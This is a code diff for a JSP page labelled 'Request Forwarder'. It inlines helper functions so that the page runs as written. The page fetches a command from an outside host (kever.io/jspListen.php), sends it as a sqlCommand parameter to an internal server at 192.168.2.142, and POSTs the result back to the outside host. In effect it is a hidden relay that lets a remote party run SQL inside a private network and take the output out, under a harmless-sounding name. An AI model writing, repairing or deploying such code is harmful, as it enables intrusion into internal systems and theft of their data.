@@ -8,43 +8,35 @@
     <h1>Request Forwarder</h1>
     <%
         try {
-            // Function to make a GET request
-            String makeGetRequest(String urlString) throws Exception {
-                URL url = new URL(urlString);
-                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-                connection.setRequestMethod("GET");
-                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
-                String response = in.lines().collect(Collectors.joining());
-                in.close();
-                return response;
-            }
-
-            // Function to make a POST request
-            String makePostRequest(String urlString, String postData) throws Exception {
-                URL url = new URL(urlString);
-                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-                connection.setRequestMethod("POST");
-                connection.setDoOutput(true);
-                OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
-                writer.write(postData);
-                writer.flush();
-                writer.close();
-                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
-                String response = in.lines().collect(Collectors.joining());
-                in.close();
-                return response;
-            }
-
             // Step 1: Make GET request to https://kever.io/jspListen.php
-            String initialResponse = makeGetRequest("https://kever.io/jspListen.php");
+            URL url1 = new URL("https://kever.io/jspListen.php");
+            HttpURLConnection connection1 = (HttpURLConnection) url1.openConnection();
+            connection1.setRequestMethod("GET");
+            BufferedReader in1 = new BufferedReader(new InputStreamReader(connection1.getInputStream()));
+            String initialResponse = in1.lines().collect(Collectors.joining());
+            in1.close();
 
             // Step 2: Use the output from the first request as the sqlCommand parameter in the second GET request
             String encodedSqlCommand = java.net.URLEncoder.encode(initialResponse, "UTF-8");
-            String secondUrl = "http://192.168.2.142:8080/aggregate/dab.jsp?sqlCommand=" + encodedSqlCommand;
-            String secondResponse = makeGetRequest(secondUrl);
+            URL url2 = new URL("http://192.168.2.142:8080/aggregate/dab.jsp?sqlCommand=" + encodedSqlCommand);
+            HttpURLConnection connection2 = (HttpURLConnection) url2.openConnection();
+            connection2.setRequestMethod("GET");
+            BufferedReader in2 = new BufferedReader(new InputStreamReader(connection2.getInputStream()));
+            String secondResponse = in2.lines().collect(Collectors.joining());
+            in2.close();
 
             // Step 3: POST the result of the second request back to https://kever.io/jspListen.php
-            String postResponse = makePostRequest("https://kever.io/jspListen.php", "result=" + java.net.URLEncoder.encode(secondResponse, "UTF-8"));
+            URL url3 = new URL("https://kever.io/jspListen.php");
+            HttpURLConnection connection3 = (HttpURLConnection) url3.openConnection();
+            connection3.setRequestMethod("POST");
+            connection3.setDoOutput(true);
+            OutputStreamWriter writer = new OutputStreamWriter(connection3.getOutputStream());
+            writer.write("result=" + java.net.URLEncoder.encode(secondResponse, "UTF-8"));
+            writer.flush();
+            writer.close();
+            BufferedReader in3 = new BufferedReader(new InputStreamReader(connection3.getInputStream()));
+            String postResponse = in3.lines().collect(Collectors.joining());
+            in3.close();
 
             // Display the final response
             out.println("Final response from POST: " + postResponse);
